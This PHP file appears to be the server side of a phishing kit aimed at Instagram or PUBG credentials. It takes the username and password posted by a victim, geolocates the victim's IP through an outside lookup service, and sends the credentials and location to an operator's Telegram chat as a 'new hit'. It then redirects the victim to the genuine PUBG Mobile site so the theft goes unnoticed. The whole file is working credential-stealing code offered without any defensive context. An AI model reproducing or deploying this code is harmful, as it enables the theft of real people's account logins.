<?php
error_reporting(0);
$URHFB = __dir__;
$text = $_POST['user'];
$password = $_POST['password'];
include "index.php"; 
$API_KEY = file_get_contents("$URHFB/rokewjabdkdhhbb.txt");
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $yhya = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$yhya";
        $yhyasyrian = file_get_contents($url);
        return json_decode($yhyasyrian);
    }
    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name ;
$jsondata = json_decode($cty2);
$cty2 = $jsondata-> getcalling_code;
$api = json_decode(file_get_contents("https://dlyar-dev.tk/api/whois.php?ip=".$ip));

$flag = $api->flag;
$ccode = $api->code;
$time_zone = $api->time_zone;
$capital = $api->capital;
$country = $api->country;;
$currency = $api->currency;
$admin = file_get_contents("$URHFB/jwidbdjwhh.txt");
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
𝑯𝑰 𝑵𝑬𝑾 𝑯𝑰𝑻 (𝑰𝑵𝑺𝑻𝑨) 𖡛“
━━━━━━━━━━━━━━━━ 
𝑼𝑺𝑬𝑹 » `$text`
𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 » `$password`
𝑪𝑶𝑫𝑬» `$ccode`
𝑪𝑶𝑼𝑵𝑻𝑹𝒀» $country $flag
𝑰𝑷 » $ip
By @BBBBIlB
━━━━━━━━━━━━━━━━ 
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: https://www.pubgmobile.com/en-US/home.shtml');
